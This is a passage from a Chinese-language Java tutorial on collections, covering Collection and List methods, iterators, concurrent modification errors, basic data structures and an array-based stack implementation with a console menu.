class="hljs-string">&quot;中神通&quot;</span>));<span class="hljs-comment">//false</span><br>        System.out.println(con.contains(<span class="hljs-string">&quot;东邪&quot;</span>));<span class="hljs-comment">//true</span><br><br>        <span class="hljs-comment">//判断集合是否为空</span><br>        System.out.println(con.isEmpty());<span class="hljs-comment">//false</span><br>        con.clear();<span class="hljs-comment">//清空集合</span><br>        System.out.println(con.isEmpty());<span class="hljs-comment">//true</span><br><br>        System.out.println(<span class="hljs-string">&quot;操作后：&quot;</span> + con);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="decdafff"></a></p><h3 id="2-3-Collection集合的遍历"><a href="#2-3-Collection集合的遍历" class="headerlink" title="2.3 - Collection集合的遍历"></a>2.3 - Collection集合的遍历</h3><ul><li>迭代器，集合的专属遍历工具</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Collection;<br><span class="hljs-keyword">import</span> java.util.Iterator;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  Collection集合的遍历</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        Collection&lt;String&gt; con = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><br>        con.add(<span class="hljs-string">&quot;111&quot;</span>);<br>        con.add(<span class="hljs-string">&quot;222&quot;</span>);<br>        con.add(<span class="hljs-string">&quot;333&quot;</span>);<br>        con.add(<span class="hljs-string">&quot;444&quot;</span>);<br>        con.add(<span class="hljs-string">&quot;555&quot;</span>);<br><br>        <span class="hljs-comment">//没有索引，所以不能使用普通的for循环</span><br><br>        <span class="hljs-comment">//foreach</span><br>        <span class="hljs-keyword">for</span> (String str : con) &#123;<br>            System.out.print(str + <span class="hljs-string">&quot;\t&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">//foreach底层就是使用迭代器实现的，可以通过字节码文件查看验证</span><br>        System.out.println();<br><br>        <span class="hljs-comment">//迭代器</span><br>        Iterator&lt;String&gt; it = con.iterator();<span class="hljs-comment">//创建迭代器</span><br>        <span class="hljs-keyword">while</span> (it.hasNext()) &#123;<span class="hljs-comment">//判断下一个位置是否有元素</span><br>            System.out.print(it.next() + <span class="hljs-string">&quot;\t&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="075a44fc"></a></p><h2 id="3-List"><a href="#3-List" class="headerlink" title="3 - List"></a>3 - List</h2><p><a name="a59637b1"></a></p><h3 id="3-1-概述"><a href="#3-1-概述" class="headerlink" title="3.1 - 概述"></a>3.1 - 概述</h3><ul><li>有序集合（指的是读写顺序，也就是说存储和读取的顺序是一致的，并非逻辑顺序）</li><li>List与Set集合不同，List中允许出现重复的值，Set则不允许。<br>  <a name="eacf9869"></a></li></ul><h3 id="3-2-List特有方法"><a href="#3-2-List特有方法" class="headerlink" title="3.2 - List特有方法"></a>3.2 - List特有方法</h3><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>void add(int index ,E e)</code></td><td>根据索引位置添加元素</td></tr><tr><td><code>E remove(int index)</code></td><td>根据索引位置删除元素</td></tr><tr><td><code>E set(int index , E e )</code></td><td>根据索引位置设置元素</td></tr><tr><td><code>E get(int index)</code></td><td>根据索引位置获取元素</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  List集合特有方法</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo04</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><br>        <span class="hljs-comment">//追加的方式添加元素</span><br>        list.add(<span class="hljs-string">&quot;111&quot;</span>);<br>        list.add(<span class="hljs-string">&quot;222&quot;</span>);<br>        list.add(<span class="hljs-string">&quot;333&quot;</span>);<br>        list.add(<span class="hljs-string">&quot;444&quot;</span>);<br><br>        <span class="hljs-comment">//插入元素</span><br>        list.add(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;000&quot;</span>);<br><br>        <span class="hljs-comment">//删除</span><br>        System.out.println(list.remove(<span class="hljs-number">3</span>));<br><br>        <span class="hljs-comment">//设置元素</span><br>        System.out.println(list.set(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;333&quot;</span>));<br><br>        System.out.println(list);<br><br>        <span class="hljs-comment">//List集合可以通过普通for循环遍历</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; list.size(); i++) &#123;<br>            System.out.println(list.get(i));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="1631b4a3"></a></p><h3 id="3-3-并发性修改异常"><a href="#3-3-并发性修改异常" class="headerlink" title="3.3 - 并发性修改异常"></a>3.3 - 并发性修改异常</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Iterator;<br><span class="hljs-keyword">import</span> java.util.ListIterator;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  并发性修改异常</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo05</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ArrayList&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<span class="hljs-comment">//创建空集合</span><br><br>        list.add(<span class="hljs-string">&quot;JavaSE&quot;</span>);<br>        list.add(<span class="hljs-string">&quot;MySql&quot;</span>);<br>        list.add(<span class="hljs-string">&quot;Linux&quot;</span>);<br>        list.add(<span class="hljs-string">&quot;Redis&quot;</span>);<br><br>        <span class="hljs-comment">//创建迭代器对象，同时迭代器会对于集合有预期的迭代次数</span><br><span class="hljs-comment">//        Iterator&lt;String&gt; it = list.iterator();</span><br><span class="hljs-comment">//        while (it.hasNext())&#123;</span><br><span class="hljs-comment">//            String str = it.next();</span><br><span class="hljs-comment">//            if (&quot;MySql&quot;.equals(str))&#123;</span><br><span class="hljs-comment">//                list.add(&quot;JDBC&quot;);</span><br><span class="hljs-comment">//            &#125;</span><br><span class="hljs-comment">//        &#125;//java.util.ConcurrentModificationException  并发性修改异常</span><br><br>        <span class="hljs-comment">//解决并发性修改异常的方法</span><br>        <span class="hljs-comment">//方法一：不使用迭代器</span><br><span class="hljs-comment">//        for (int i = 0; i &lt; list.size(); i++) &#123;</span><br><span class="hljs-comment">//            if(&quot;MySql&quot;.equals(list.get(i)))&#123;</span><br><span class="hljs-comment">//                list.add(i + i,&quot;JDBC&quot;);</span><br><span class="hljs-comment">//            &#125;</span><br><span class="hljs-comment">//        &#125;</span><br><br>        <span class="hljs-comment">//方法二：listIterator,更高级的迭代器</span><br>        ListIterator&lt;String&gt; lit = list.listIterator();<span class="hljs-comment">//可以更改预期迭代的个数</span><br>        <span class="hljs-keyword">while</span> (lit.hasNext())&#123;<span class="hljs-comment">//判断下一个位置是否有元素</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;MySql&quot;</span>.equals(lit.next()))&#123;<span class="hljs-comment">//在集合中找MySql</span><br>                lit.add(<span class="hljs-string">&quot;JDBC&quot;</span>);<br>            &#125;<br>        &#125;<br><br>        System.out.println(list);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="e347f998"></a></p><h3 id="3-4-数据结构"><a href="#3-4-数据结构" class="headerlink" title="3.4 - 数据结构"></a>3.4 - 数据结构</h3><blockquote><p>计算机存储与组织数据的方式，其中包含了若干种特定关系的集合，通常通过精心设计的数据结构会给程序带来效率上的提高</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO 数据结构的应用</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo06</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String[] sex = &#123;<span class="hljs-string">&quot;girl&quot;</span>,<span class="hljs-string">&quot;boy &quot;</span>&#125;;<br>        ArrayList&lt;Student&gt; stuList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<span class="hljs-comment">//创建集合用来存储学生对象</span><br><br>        stuList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;Andy&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">18</span>));<br>        stuList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;Lily&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">21</span>));<br>        stuList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;Jack&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">16</span>));<br>        stuList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;Lucy&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">19</span>));<br><br>        <span class="hljs-keyword">for</span> (Student stu : stuList) &#123;<span class="hljs-comment">//遍历集合</span><br>            System.out.printf(<span class="hljs-string">&quot;%s\t%s\t%d\n&quot;</span>,<br>                    stu.getName(),<br>                    sex[stu.getSex()],<br>                    stu.getAge());<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="735f3186"></a></p><h4 id="3-4-1-栈模型"><a href="#3-4-1-栈模型" class="headerlink" title="3.4.1 - 栈模型"></a>3.4.1 - 栈模型</h4><blockquote><p>栈模型：只有一个开口，先进后出，后进先出</p></blockquote><ul><li>栈底元素：最先进入到栈模型的元素</li><li>栈顶元素：最后进入到栈模型的元素</li><li>压栈、进栈：数据进入栈模型的过程</li><li>弹栈、出栈：数据离开栈模型的过程<br>  <a name="3a75b9ac"></a></li></ul><h4 id="3-4-2-队列模型"><a href="#3-4-2-队列模型" class="headerlink" title="3.4.2 - 队列模型"></a>3.4.2 - 队列模型</h4><blockquote><p>队列模型：有两个开口，先进先出，后进后出，数据的流向只有一个方法</p></blockquote><ul><li>入队列：数据从后端进入队列的过程</li><li>出队列：数据从前端离开队列的过程<br>  <a name="8a766d4f"></a></li></ul><h4 id="3-4-5-数组模型"><a href="#3-4-5-数组模型" class="headerlink" title="3.4.5 - 数组模型"></a>3.4.5 - 数组模型</h4><blockquote><p>数组模型，是一种查询和修改快，但是删除和添加慢的一种数据模型。</p></blockquote><ul><li>查询和修改元素可以通过索引直接定位到元素位置</li><li>添加和删除元素需要对目标元素之后的内容做位置上的调整</li><li>交换法排序算法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  数组中经典算法：交换法排序</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo07</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//初始化方式创建数组</span><br><br>        System.out.println(<span class="hljs-string">&quot;排序前：&quot;</span> + Arrays.toString(arr));<br><br>        <span class="hljs-comment">//交换法排序</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length - <span class="hljs-number">1</span>; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; arr.length - <span class="hljs-number">1</span> - i; j++) &#123;<br>                <span class="hljs-keyword">if</span>(arr[j] &gt; arr[arr.length - <span class="hljs-number">1</span> - i])&#123;<br>                    arr[j] ^= arr[arr.length - <span class="hljs-number">1</span> - i];<br>                    arr[arr.length - <span class="hljs-number">1</span> - i] ^= arr[j];<br>                    arr[j] ^= arr[arr.length - <span class="hljs-number">1</span> - i];<br>                    <span class="hljs-comment">/*位运算中的运算符,两变量值的互换</span><br><span class="hljs-comment">                        a ^= b;</span><br><span class="hljs-comment">                        b ^= a;</span><br><span class="hljs-comment">                        a ^= b;</span><br><span class="hljs-comment">                    * */</span><br>                &#125;<br>            &#125;<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;排序后：&quot;</span> + Arrays.toString(arr));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="4ea7905a"></a></p><h4 id="3-4-6-链表模型"><a href="#3-4-6-链表模型" class="headerlink" title="3.4.6 - 链表模型"></a>3.4.6 - 链表模型</h4><blockquote><p>针对于数组而言，链表模型是一种查询和修改慢，添加和删除快的一种数据模型。</p></blockquote><ul><li>节点：一个数据单元</li><li>数据域：数据单元中用来存储数据的成员</li><li>指针域：数据单元中用来存储下一个节点成员<br>  <a name="31ae153a"></a></li></ul><h4 id="3-4-7-一维数组模拟栈模型"><a href="#3-4-7-一维数组模拟栈模型" class="headerlink" title="3.4.7 - 一维数组模拟栈模型"></a>3.4.7 - 一维数组模拟栈模型</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo01;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  模拟栈模型</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayStack</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">top</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<span class="hljs-comment">//控制栈顶元素位置</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> maxSize;<span class="hljs-comment">//设置栈模型大小</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span>[] stack;<span class="hljs-comment">//用来存放栈的引用类型</span><br><br>    <span class="hljs-comment">//通过构造器设置栈中存储的最大值</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ArrayStack</span><span class="hljs-params">(<span class="hljs-type">int</span> maxSize)</span> &#123;<br>        <span class="hljs-built_in">this</span>.maxSize = maxSize;<br>        stack = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[maxSize];<br>    &#125;<br>    <span class="hljs-comment">//满栈</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isFull</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> top == maxSize - <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-comment">//空栈</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isEmpty</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> top == -<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-comment">//压栈（进栈）</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">push</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span>&#123;<br>        <span class="hljs-comment">//判断栈是否已满</span><br>        <span class="hljs-keyword">if</span>(isFull())&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;栈已满&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">//栈没满</span><br>        top++;<br>        stack[top] = n;<br>    &#125;<br>    <span class="hljs-comment">//弹栈（出栈）</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">pop</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">if</span>(isEmpty())&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;栈为空&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">//取栈中的数据</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> stack[top];<br>        top--;<br>        <span class="hljs-keyword">return</span> val;<br>    &#125;<br>    <span class="hljs-comment">//显示栈中的数据</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">list</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">if</span> (isEmpty())&#123;<br>            System.err.println(<span class="hljs-string">&quot;栈空，没有数据&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">//从栈顶开始展示数据</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> top; i &gt;= <span class="hljs-number">0</span> ; i--) &#123;<br>            System.out.println(<span class="hljs-string">&quot;stack[&quot;</span> + i +<span class="hljs-string">&quot;] = &quot;</span> + stack[i]);<br>        &#125;<br>    &#125;<br><br>&#125;<br>----------------------------------------------------<br><span class="hljs-keyword">package</span> demo01;<br><br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  栈模型测试类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Stack</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//通过栈模型的构造器设置最多存储的数据长度，以及创建栈模型对象</span><br>        <span class="hljs-type">ArrayStack</span> <span class="hljs-variable">stack</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayStack</span>(<span class="hljs-number">10</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-comment">//用来存储用户键盘输入的指令</span><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">loop</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<span class="hljs-comment">//控制是否退出菜单</span><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        <span class="hljs-keyword">while</span> (loop)&#123;<br>            System.out.println(<span class="hljs-string">&quot;show:显示栈&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;exit:退出程序&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;push:添加数据到栈&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;pop:从栈中取出数据&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;请输入你的选项：&quot;</span>);<br>            key = sc.next();<span class="hljs-comment">//用过键盘输入获取用户的选项</span><br><br>            <span class="hljs-keyword">switch</span> (key)&#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;show&quot;</span>:<span class="hljs-comment">//显示栈</span><br>                    stack.list();<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;push&quot;</span>:<span class="hljs-comment">//压栈</span><br>                    <span class="hljs-type">int</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> sc.nextInt();<span class="hljs-comment">//获取用户想要存储的整数类型</span><br>                    stack.push(val);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;pop&quot;</span>:<span class="hljs-comment">//弹栈</span><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">int</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> stack.pop();<span class="hljs-comment">//从栈顶开始取，栈中可能没有数据，所以会抛出异常</span><br>                        System.out.println(<span class="hljs-string">&quot;出栈的数据为：&quot;</span> + res);<br>                    &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                        System.err.println(e.getMessage());<span class="hljs-comment">//打印异常原因</span><br>                    &#125;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;exit&quot;</span>:<br>                    sc.close();<br>                    loop = <span class="hljs-literal">false</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="ca5c876c"></a></p><h3 id="3-5-LinkedList"><a href="#3-5-LinkedList" class="headerlink" title="3.5 - LinkedList"></a>3.5 - LinkedList</h3><ul><li>ArrayList 